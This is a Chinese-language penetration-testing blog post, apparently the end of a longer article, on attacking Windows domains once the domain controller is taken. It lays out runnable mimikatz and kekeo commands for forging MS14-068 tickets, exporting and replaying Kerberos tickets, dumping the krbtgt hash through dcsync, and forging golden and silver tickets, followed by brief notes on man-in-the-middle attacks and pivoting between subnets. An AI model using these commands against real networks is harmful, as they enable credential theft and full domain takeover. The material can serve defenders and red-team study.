<p>附上横向域渗透【案例比较经典】</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.mottoin.com/89413.html
</code></pre>
</div>

<h3 id="提取票据">提取票据</h3>

<h5 id="传递票据">传递票据</h5>

<p>因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据，kekeo的快捷用法仅需要以下参数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/gentilkiwi/kekeo/releases

ms14068.exe /domain:test.local /user:test /password:test /ptt
</code></pre>
</div>

<p>在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控</p>

<p>通过mimikatz导出内存中的Ticket，执行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::tickets /export
</code></pre>
</div>
<p>保存成文件，一共导出如下文件，找个像这样的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>xxx@krbtgt-TEST.LOCAL.kirbi
</code></pre>
</div>

<p>在域普通用户的主机进行导入：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::ptt C:\test\xxx@krbtgt-TEST.LOCAL.kirbi"
</code></pre>
</div>

<p>查看是否有域控权限，</p>
<div class="highlighter-rouge"><pre class="highlight"><code>klist
dir \\xxxx\c$
</code></pre>
</div>
<h5 id="金票据">金票据</h5>

<p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>

<p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>

<p>域控执行下面的命令，生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "lsadump::dcsync /domain:test.local /user:krbtgt"
</code></pre>
</div>
<p>找到如下的信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>/domain：test.local
/sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f
</code></pre>
</div>
<p>生成Golden Ticket,伪造的用户设置为god,执行下面的命令，生成文件gold.kirbi:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god 
/ticket:gold.kirbi"
</code></pre>
</div>

<p>注意，生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。</p>

<p>导入Golden Ticket：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz# kerberos::ptt c:\test\gold.kirbi
</code></pre>
</div>
<p>检验是否成功获得域控权限：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:&gt;klist
c:&gt;dir \\xxxx\c$
</code></pre>
</div>
<p>注意：
这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好。可以伪造任意用户，即使其不存在。可以伪造任意用户，即使其不存在。</p>

<p>另一种做法，大同小异，注意这里填写的是域管理：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz # kerberos::purge
mimikatz # kerberos::golden /admin:Administrator /domain:pentstlab.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi
mimikatz # kerberos::ptt Administrator.kiribi
mimikatz # kerberos::tgt

#验证下：
E:\&gt;net use \\WIN-0DKN2AS0T2G\c$
E:\&gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
</code></pre>
</div>

<h5 id="银票据">银票据</h5>
<p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket。
将它同Golden Ticket做对比：</p>
<blockquote>
  <p>1、访问权限不同
Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限。
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。</p>
</blockquote>

<blockquote>
  <p>2、加密方式不同
Golden Ticket是由krbtgt的hash加密
Silver Ticket是由服务账户（通常为计算机账户）hash加密</p>
</blockquote>

<blockquote>
  <p>3、认证流程不同
Golden Ticket在使用的过程需要同域控通信
Silver Ticket在使用的过程不需要同域控通信
也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。</p>
</blockquote>

<p>在域控上执行如下命令来获取域控主机的本地管理员账户hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "sekurlsa::logonpasswords"
</code></pre>
</div>

<p>整理信息，使用mimikatz执行如下命令导入Silver Ticket，此时可以成功访问域控上的文件共享：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"
</code></pre>
</div>
<p>注意：
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。
代替方案，如下可以远程访问LDAP服务来获得krbtgt的信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"
</code></pre>
</div>

<p>注意：</p>
<blockquote>
  <p>lsadump::dcsync
向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
只读域控制器默认不允许读取用户密码数据。</p>
</blockquote>

<h3 id="中间人攻击">中间人攻击</h3>

<p>中间人攻击有很多方法，有借助arp进行双向欺骗嗅探，有借助内网DNS劫持的，有借助断网重连直接劫持的。</p>

<p>经典的工具有netfuke，cain，ettercap等等。</p>

<p>具体的在此不多说，以后有机会继续补充。</p>

<h3 id="跨网段攻击">跨网段攻击</h3>

<h5 id="借助多网卡主机">借助多网卡主机</h5>

<p>如果在多网卡主机的情况下，我们可以通过msf建立路由，然后转发，最终通过sock建立代理。</p>

<h5 id="借助交换机路由">借助交换机/路由</h5>

<p>一般大一点的路由，或者三、四层交换机可能会提供VPN功能，通过命令行或者WEB界面能操作进行启用或转发。
当然部分命令行被封装在沙盒里，功能是比较有限的。</p>

<h5 id="借助代理">借助代理</h5>

<p>内网和外网入口本身可能存在认证vpn【默认密码、弱口令】，甚至匿名代理。而通过他们我们也可以跨网段进行渗透。</p>

<h3 id="后记">后记</h3>

<p>本文大部分资料参考自网络，因为内容太多无法一一附上出处，有介意的原作者请私信我加上。
最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。</p>
